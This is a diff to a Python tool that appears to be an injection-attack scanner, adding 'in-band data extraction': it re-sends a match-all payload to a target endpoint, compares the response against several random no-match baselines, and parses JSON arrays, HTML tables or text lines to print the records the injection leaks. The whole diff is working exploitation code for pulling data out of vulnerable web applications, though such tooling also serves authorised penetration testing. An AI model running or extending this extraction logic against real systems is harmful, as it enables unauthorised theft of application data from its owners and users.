@@ -375,6 +375,12 @@ def _payload_repr(spec, method, vector):
     return "&".join(parts)
 
 
+# ---- In-band data extraction --------------------------------------------------
+# Re-send the match-all payload, then surface the RECORDS it returns that a set
+# of no-match baselines do not.  Format-aware (JSON array / HTML table / text)
+# and noise-filtered via multiple baselines, so it is not tied to one app's
+# markup.
+
 def _strip_html(s):
     s = re.sub(r"(?is)<(script|style).*?</\1>", "", s)
     s = re.sub(r"(?s)<[^>]+>", " ", s)
@@ -386,21 +392,90 @@ def _strip_html(s):
     return out
 
 
-def dump_inband(ctx, method, base_url, vector, fields_literal, finding):
-    # In-band extraction: re-send the match-all payload and surface the rows it
-    # returns that a baseline (no-match) request does not -- the leaked data.
+def _json_records(obj):
+    # Every array element (dicts and scalars), serialized, recursively.
+    recs = []
+    if isinstance(obj, dict):
+        for v in obj.values():
+            recs += _json_records(v)
+    elif isinstance(obj, list):
+        for e in obj:
+            if isinstance(e, list):
+                recs += _json_records(e)
+            elif isinstance(e, dict):
+                recs.append(_json.dumps(e, sort_keys=True, ensure_ascii=False))
+            else:
+                recs.append(_json.dumps(e, ensure_ascii=False))
+    return recs
+
+
+def _dump_json(full, bases):
     try:
-        base = _send(ctx, method, base_url, vector, {n: ("lit", _rand()) for n in fields_literal})
+        frecs = _json_records(_json.loads(full))
+    except ValueError:
+        return None
+    if not frecs:
+        return None
+    seen = set()
+    for b in bases:
+        try:
+            seen |= set(_json_records(_json.loads(b)))
+        except ValueError:
+            pass
+    leaked = [r for r in frecs if r not in seen]
+    return ("json", leaked or frecs)
+
+
+def _html_rows(html):
+    rows = []
+    for tr in re.findall(r"(?is)<tr[^>]*>(.*?)</tr>", html):
+        cells = re.findall(r"(?is)<t[dh][^>]*>(.*?)</t[dh]>", tr)
+        cells = [re.sub(r"\s+", " ", re.sub(r"(?s)<[^>]+>", " ", c)).strip() for c in cells]
+        if any(cells):
+            rows.append(cells)
+    return rows
+
+
+def _dump_html_table(full, bases):
+    rows = _html_rows(full)
+    if not rows:
+        return None
+    base_rows = set()
+    for b in bases:
+        base_rows |= set(tuple(r) for r in _html_rows(b))
+    leaked = [r for r in rows if tuple(r) not in base_rows]
+    out = [" | ".join(r) for r in (leaked or rows)]
+    return ("table", out)
+
+
+def _dump_lines(full, bases):
+    template = None
+    for b in bases:
+        s = set(_strip_html(b))
+        template = s if template is None else (template & s)
+    template = template or set()
+    leaked = [l for l in _strip_html(full) if l not in template]
+    return ("text", leaked)
+
+
+def dump_inband(ctx, method, base_url, vector, fields_literal, finding, samples=3):
+    try:
         full = _send(ctx, method, base_url, vector, finding["spec"])
+        bases = [_send(ctx, method, base_url, vector, {n: ("lit", _rand()) for n in fields_literal})
+                 for _ in range(samples)]
     except requests.RequestException as e:
         print("    in-band dump error: %s" % e)
         return
-    base_lines = set(_strip_html(base.body))
-    leaked = [l for l in _strip_html(full.body) if l not in base_lines]
-    print("\n[*] In-band dump via  %s" % _payload_repr(finding["spec"], method, finding["vector"]))
-    print("    %d line(s) returned by the match-all query that the baseline did not:" % len(leaked))
-    for l in leaked:
-        print("      " + l)
+    bodies = [b.body for b in bases]
+    result = (_dump_json(full.body, bodies)
+              or _dump_html_table(full.body, bodies)
+              or _dump_lines(full.body, bodies))
+    fmt, records = result
+    print("\n[*] In-band dump via  %s  (format: %s, %d baseline samples)"
+          % (_payload_repr(finding["spec"], method, finding["vector"]), fmt, samples))
+    print("    %d record(s) returned by the match-all query beyond baseline:" % len(records))
+    for r in records:
+        print("      " + r)
 
 
 # ---------------------------------------------------------------------------
